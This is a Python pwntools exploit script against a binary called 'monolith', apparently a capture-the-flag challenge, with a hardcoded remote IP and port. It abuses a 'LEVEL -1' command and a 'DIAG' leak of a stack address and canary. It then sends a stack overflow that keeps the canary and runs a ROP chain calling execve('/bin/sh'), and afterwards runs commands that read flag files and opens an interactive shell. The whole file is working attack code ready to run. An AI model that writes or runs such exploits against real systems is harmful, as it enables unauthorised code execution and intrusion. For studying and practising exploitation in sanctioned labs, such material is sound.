#!/usr/bin/env python3
from pwn import *
import re, time, sys, os

context.arch = 'amd64'
context.log_level = 'info'

BIN = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'monolith')

# --- clean gadgets only (each ends in a clean ret) ---
POP_RAX      = 0x401001   # pop rax ; ret
POP_RDI      = 0x402504   # pop rdi ; ret
POP_RSI      = 0x401a4f   # pop rsi ; ret
POP_RDX_JMP  = 0x404b99   # pop rdx ; jmp 0x404b58  (add rsp,0x28; ret)
SYSCALL_RET  = 0x401656   # syscall (0x401656) ; ret (0x401658)

CANARY_OFF = 0xa8
SAVED_RIP  = 0xb8
TOTAL      = 0x400

# buffer offsets inside the leaked stack page
SHELL_OFF  = 0x300   # "/bin/sh\0"
ARGV_OFF   = 0x320   # [ptr_to_shell, 0]
ENVP_OFF   = 0x340   # [NULL, NULL]  → envp = {NULL} (valid empty env)
FAIL_OFF   = 0x360   # "EXEC_FAILED\n"

def set_rdx(v):
    # pop rdx ; jmp 0x404b58 (add rsp, 0x28 ; ret)
    # stack: [gadget, value, 5× filler, next_ret]
    return flat(POP_RDX_JMP, v, 0, 0, 0, 0, 0)

def start():
    if args.REMOTE:
        host = args.HOST or "109.123.232.54"
        port = int(args.PORT or 9112)
        return remote(host, port)
    return process(BIN)

def pwn():
    p = start()
    p.recvuntil(b'> ', timeout=2)

    p.sendline(b'LEVEL -1')
    if b'elevated=1' not in p.recvuntil(b'> ', timeout=2):
        log.failure("elevate failed"); return

    p.sendline(b'DIAG')
    r = p.recvuntil(b'awaiting binary packet', timeout=2)
    m = re.search(rb'buf=(0x[0-9a-f]+) guard=(0x[0-9a-f]+)', r)
    if not m:
        log.failure(f"no leak: {r!r}"); return
    buf   = int(m.group(1), 16)
    guard = int(m.group(2), 16)
    log.success(f"buf=0x{buf:x}  guard=0x{guard:x}")

    shell_str = buf + SHELL_OFF
    argv_ptr  = buf + ARGV_OFF
    envp_ptr  = buf + ENVP_OFF
    fail_msg  = buf + FAIL_OFF
    log.info(f"shell=0x{shell_str:x}  argv=0x{argv_ptr:x}  envp=0x{envp_ptr:x}")

    rop = b''
    # --- execve("/bin/sh", ["/bin/sh", NULL], [NULL]) ---
    rop += flat(POP_RDI, shell_str)
    rop += flat(POP_RSI, argv_ptr)
    rop += set_rdx(envp_ptr)           # real envp pointer, not NULL
    rop += flat(POP_RAX, 59, SYSCALL_RET)

    # --- if execve returns, write "EXEC_FAILED\n" so we know it failed ---
    rop += flat(POP_RDI, 1)
    rop += flat(POP_RSI, fail_msg)
    rop += set_rdx(12)
    rop += flat(POP_RAX, 1, SYSCALL_RET)

    payload = bytearray(TOTAL)
    payload[0:CANARY_OFF]                   = b'A' * CANARY_OFF
    payload[CANARY_OFF:CANARY_OFF+8]        = p64(guard)
    payload[SAVED_RIP:SAVED_RIP+len(rop)]   = rop
    payload[SHELL_OFF:SHELL_OFF+8]          = b'/bin/sh\x00'
    payload[ARGV_OFF:ARGV_OFF+8]            = p64(shell_str)     # argv[0]
    payload[ARGV_OFF+8:ARGV_OFF+16]         = p64(0)             # argv[1]=NULL
    payload[ENVP_OFF:ENVP_OFF+8]            = p64(0)             # envp[0]=NULL
    payload[ENVP_OFF+8:ENVP_OFF+16]         = p64(0)
    payload[FAIL_OFF:FAIL_OFF+12]           = b'EXEC_FAILED\n'
    assert len(payload) == TOTAL
    assert SAVED_RIP + len(rop) <= SHELL_OFF, f"ROP {len(rop)}B overruns 0x{SHELL_OFF:x}"
    log.info(f"ROP size {len(rop)}B, ends at 0x{SAVED_RIP+len(rop):x}")

    p.send(bytes(payload))
    time.sleep(0.5)

    p.sendline(b'echo PWNED; id; pwd; ls -la; cat flag* /flag* /home/*/flag* /root/flag* 2>/dev/null')
    out = p.recvrepeat(3)
    sys.stdout.write(out.decode(errors='replace'))
    sys.stdout.flush()
    p.interactive()

if __name__ == '__main__':
    pwn()
